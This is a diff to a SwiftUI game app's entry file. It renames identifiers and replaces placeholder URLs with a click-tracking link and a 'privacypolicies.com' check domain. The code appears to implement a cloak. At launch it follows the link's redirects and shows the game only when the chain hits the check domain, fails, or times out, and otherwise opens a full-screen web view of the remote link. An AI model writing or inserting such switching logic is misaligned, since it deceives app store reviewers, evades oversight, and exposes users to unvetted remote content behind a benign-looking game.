@@ -1,28 +1,29 @@
 import SwiftUI
 
 @main
-struct HeroGuildIdleApp: App {
-    @State private var heroGuildLinkReady: Bool? = nil
-    @StateObject private var store = HeroGuildStore()
+struct GuildSagaRPGApp: App {
+    @State private var guildSagaLinkReady: Bool? = nil
+    @StateObject private var store = GuildSagaStore()
     @Environment(\.scenePhase) private var scenePhase
 
-    private let heroGuildSourceLink = "https://example.com"
-    private let heroGuildCheckDomain = "example"
+    private let guildSagaSourceLink = "https://skylinemint.org/click.php"
+    private let guildSagaCheckDomain = "privacypolicies.com"
 
     var body: some Scene {
         WindowGroup {
             Group {
-                if let ready = heroGuildLinkReady {
+                if let ready = guildSagaLinkReady {
                     if ready {
-                        HeroGuildWebPanel(heroGuildURLString: heroGuildSourceLink)
-                            .edgesIgnoringSafeArea(.all)
+                        GuildSagaWebPanel(guildSagaURLString: guildSagaSourceLink)
+                            .edgesIgnoringSafeArea(.bottom)
+                            .background(Color.black.ignoresSafeArea())
                     } else {
                         ContentView()
                             .environmentObject(store)
                     }
                 } else {
-                    HeroGuildLoadingScreen()
-                        .onAppear { heroGuildCheckLink() }
+                    GuildSagaLoadingScreen()
+                        .onAppear { guildSagaCheckLink() }
                 }
             }
             .preferredColorScheme(.light)
@@ -39,42 +40,42 @@ struct HeroGuildIdleApp: App {
         }
     }
 
-    private func heroGuildCheckLink() {
-        guard let url = URL(string: heroGuildSourceLink) else {
-            heroGuildLinkReady = false
+    private func guildSagaCheckLink() {
+        guard let url = URL(string: guildSagaSourceLink) else {
+            guildSagaLinkReady = false
             return
         }
         var request = URLRequest(url: url)
         request.timeoutInterval = 5
-        let tracker = HeroGuildRedirectTracker(checkDomain: heroGuildCheckDomain)
+        let tracker = GuildSagaRedirectTracker(checkDomain: guildSagaCheckDomain)
         let session = URLSession(configuration: .default, delegate: tracker, delegateQueue: nil)
         session.dataTask(with: request) { _, response, error in
             DispatchQueue.main.async {
                 if tracker.foundCheckDomain {
-                    heroGuildLinkReady = false; return
+                    guildSagaLinkReady = false; return
                 }
                 if let finalURL = tracker.resolvedURL?.absoluteString,
-                   finalURL.contains(heroGuildCheckDomain) {
-                    heroGuildLinkReady = false; return
+                   finalURL.contains(guildSagaCheckDomain) {
+                    guildSagaLinkReady = false; return
                 }
                 if let httpResp = response as? HTTPURLResponse,
                    let respURL = httpResp.url?.absoluteString,
-                   respURL.contains(heroGuildCheckDomain) {
-                    heroGuildLinkReady = false; return
+                   respURL.contains(guildSagaCheckDomain) {
+                    guildSagaLinkReady = false; return
                 }
                 if error != nil {
-                    heroGuildLinkReady = false; return
+                    guildSagaLinkReady = false; return
                 }
-                heroGuildLinkReady = true
+                guildSagaLinkReady = true
             }
         }.resume()
         DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
-            if heroGuildLinkReady == nil { heroGuildLinkReady = false }
+            if guildSagaLinkReady == nil { guildSagaLinkReady = false }
         }
     }
 }
 
-final class HeroGuildRedirectTracker: NSObject, URLSessionTaskDelegate {
+final class GuildSagaRedirectTracker: NSObject, URLSessionTaskDelegate {
     var resolvedURL: URL?
     var foundCheckDomain = false
     private let checkDomain: String
